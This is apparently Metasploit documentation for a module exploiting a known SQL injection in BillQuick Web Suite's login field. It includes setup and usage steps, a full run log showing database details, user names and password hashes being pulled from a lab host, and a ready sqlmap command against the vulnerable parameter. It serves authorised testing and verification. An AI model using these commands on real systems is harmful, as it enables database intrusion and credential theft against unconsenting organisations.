## Vulnerable Application

This module exploits a SQL injection vulnerability in BillQUick Web 
Suite prior to version 22.0.9.1. The application is .net based, and 
the database is required to be MSSQL. Luckily the website gives 
error based SQLi messages, so it is trivial to pull data from the 
database. However the webapp uses an unknown password security 
algorithm. This vulnerability does not seem to support stacked 
queries. This module pulls the database name, 111.111.1.111, user, 
hostname, and the SecurityTable (user table).

### Install

This install can be rather complicated and take about 2hrs to install.

1. Download [ws2020](https://billquick.net/download/WS2020/WS2020Setup.zip)
1. Download [Bill Quick 2020](https://billquick.net/download/Billquick2020/BillQuick2020Setup.zip)
1. Install billquick 2020
1. reboot
1. Install IIS per WS2020 instructions (non-default options in ws2020 install docs)
1. Install .NET Framework 3.5 (for sql server 2008, powershell: `Install-WindowsFeature Net-Framework-Core`)
1. Install MSSQL Server 2008
1. Install ws2020 (.NET 4.5 is bundled, may need a reboot)
1. Open BillQuick V21 (on desktop). Configure it to a new database
1. visit http://<ip>/ws2020 and finish the install/config

Even at this point, 2 people with these instructions and one independently were unable to login to
the webapp.  It can be SQLi, but no one was able to use it successfully.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/gather/billquick_txtid_sqli`
1. Do: `set rhosts [ip]`
1. Do: `run`
1. You should get info about the system and app.

## Options

### HttpClientTimeout

As noted in the original discovery writeup, and verified during exploitation, the DB is very slow.  A high timeout should be set. Defaults to `15`

## Scenarios

### BillQuick Web Suite 21.0.11 with BillQuick 2020 on Windows 2012 r2 with MSSQL 2008

```
[*] Processing billquick.rb for ERB directives.
resource (billquick.rb)> use auxiliary/gather/billquick_txtid_sqli
resource (billquick.rb)> set rhosts 111.111.1.111
rhosts => 111.111.1.111
resource (billquick.rb)> set verbose true
verbose => true
resource (billquick.rb)> check
[*] 111.111.1.111:80 - The target appears to be vulnerable. Version Detected: 21.0.11
resource (billquick.rb)> exploit
[*] Running module against 111.111.1.111
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version Detected: 21.0.11
[*] Getting Variables
[*] VIEWSTATE: /wEPDwULLTE4MzE3MTAzMjcPZBYEAgMPDxYCHgRUZXh0BRJWZXJzaW9uOiAyMS4wLjExLjFkZAIFD2QWBgIDD2QWBgIDDw9kFgIeBGhyZWYFKWphdmFzY3JpcHQ6RGlzcGxheUhlbHAoJy9sb2dpbi5odG0nLHRydWUpZAIFDw8WAh8AZWRkAgsPD2QWAh8BBboCamF2YXNjcmlwdDpPcGVuQ3VzdG9taXplZFBhZ2UoJ2h0dHA6Ly8xOTIuMTY4LjIuMTk3OjgwL3dzMjAyMC9BZG1pbi9mcm1TdGFydHVwT3B0aW9ucy5hc3B4P1JldHVyblVSTD1odHRwOi8vMTkyLjE2OC4yLjE5Nzo4MC93czIwMjAvZGVmYXVsdC5hc3B4JlJldHVyblBhdGg9QzovUHJvZ3JhbSBGaWxlcyAoeDg2KS9CaWxsUXVpY2sgV2ViIFN1aXRlL1dlYiBTdWl0ZSAyMDIwL3B1YmxpYycsJ09wdGlvbnMnLCdzdGF0dXM9MSx0b3A9MjAsbGVmdD03MCx0b29sYmFyPTAsd2lkdGg9OTYwLGhlaWdodD04NTAsc2Nyb2xsYmFycz0xLHJlc2l6YWJsZT0xJylkAgcPDxYCHgdWaXNpYmxlaGQWBAIBDxAPFgIfAmhkZGRkAgMPDxYCHwJoZGQCCQ9kFgICAw8PZBYCHgdvbmNsaWNrBYQBSmF2YVNjcmlwdDp2YXIgTnduZD0gd2luZG93Lm9wZW4oJ2h0dHA6Ly93d3cuYnFlLmNvbS9SZWFkeVRvQnV5LmFzcCcsJ0JpbGxRdWljaycsJ3N0YXR1cz0xLHJlc2l6YWJsZT0xJyk7IE53bmQuZm9jdXMoKTtyZXR1cm4gZmFsc2U7ZGStCLctJcrVYJp1DAA1gC3rEarKhZr4l+UhXjrUi4Di4g==
[*] VIEWSTATEGENERATOR: 35DBDDBD
[*] EVENTVALIDATION: /wEdAAdXT9yBxJ2SJPiixQkGOgS3iDzhgTayErTY5zy3eV0+KFncozjiY2uerT4fyhfyLsuRO4wbr9XDALim0BHyPei6XNiiK4rX19Q4jotFU35tutB+E+wdjwdLhtRmnvNWW5XjXQFozpEkqmpvVssmq69gY0kE5exFACTMA+fC7OwSIZ2agMpDV5u2LIZn3ODypK4=
[+] Current Database: test
[+] 111.111.1.111: Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) 
        Jul  9 2008 14:17:44 
        Copyright (c) 1988-2008 Microsoft Corporation
        Developer Edition (64-bit) on Windows NT 6.2 \u003cX64\u003e (Build 9200: ) (VM)

[+] DB User: sa
[+] Hostname: WIN-EDKFSE5QPAB
[+] User Count in test.dbo.SecurityTable: 2
[+] Username: 111
[+] User 111 settings: D848281C|1|1|1|0|1|1|1|0|1|1|1|1|1|1|1|1|1|1|0|0|0|1|0|1|0|0|0|1|1|1|0|0|0|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|0|0|0|0|0|0|0|0|0|0|0|0|0|0|
[+] Username: fl
[+] User fl settings: 45E97|1|1|1|0|1|1|1|0|1|1|1|1|1|1|1|1|1|1|0|0|0|1|0|1|0|0|0|1|1|1|0|0|0|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|0|0|0|0|0|0|0|0|0|0|0|0|0|0|
[+] test.dbo.SecurityTable
======================

 EmployeeID  Settings
 ----------  --------
 111         D848281C|1|1|1|0|1|1|1|0|1|1|1|1|1|1|1|1|1|1|0|0|0|1|0|1|0|0|0|1|1|1|0|0|0|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|0|0|0|0|0|0|0|0|0|0|0|0|0|0|
 fl          45E97|1|1|1|0|1|1|1|0|1|1|1|1|1|1|1|1|1|1|0|0|0|1|0|1|0|0|0|1|1|1|0|0|0|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|1|0|0|0|0|0|0|0|0|0|0|0|0|0|0|

[*] Default password is the username.
[*] Auxiliary module execution completed
resource (billquick.rb)> hosts

Hosts
=====

address        mac  name             os_name  os_flavor  os_sp  purpose  info                                                                                                             comments
-------        ---  ----             -------  ---------  -----  -------  ----                                                                                                             --------
111.111.1.111       WIN-EDKFSE5QPAB  Windows                    device   Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) Jul  9 2008 14:17:44 Copyright (c) 1988-2008 Microsoft Cor
                                                                         porationDeveloper Edition (64-bit) on Windows NT 6.2 \u003cX64\u003e (Build 9200: ) (VM)

resource (billquick.rb)> services
Services
========

host           port  proto  name                 state  info
----           ----  -----  ----                 -----  ----
111.111.1.111  80    tcp    BillQuick Web Suite  open

resource (billquick.rb)> creds
Credentials
===========

host           origin         service                       public  private   realm  private_type        JtR Format
----           ------         -------                       ------  -------   -----  ------------        ----------
111.111.1.111  111.111.1.111  80/tcp (BillQuick Web Suite)  sa                       Blank password      
111.111.1.111  111.111.1.111  80/tcp (BillQuick Web Suite)  111     D848281C         Nonreplayable hash  
111.111.1.111  111.111.1.111  80/tcp (BillQuick Web Suite)  fl      45E97            Nonreplayable hash  

resource (billquick.rb)> notes

Notes
=====

 Time                     Host           Service              Port  Protocol  Type      Data
 ----                     ----           -------              ----  --------  ----      ----
 2021-11-06 10:26:28 UTC  111.111.1.111  BillQuick Web Suite  80    tcp       database  "test"
```

## SQLMap Equivalent

You'll need a valid `VIEWSTATE`, `VIEWSTATEGENERATOR`, `EVENTVALIDATION`.

```
sqlmap -u "http://[IP]/ws2020/default.aspx" -f txtID --data="__EVENTTARGET=cmdOK&__EVENTARGUMENT=&__VIEWSTATE=[VIEWSTATE]&__VIEWSTATEGENERATOR=[GENERATOR]&__EVENTVALIDATION=[VALIDATION]&txtID=a&txtPW=a&hdnClientDPI=96" --dbms MSSQL --time-sec 15 --batch
```
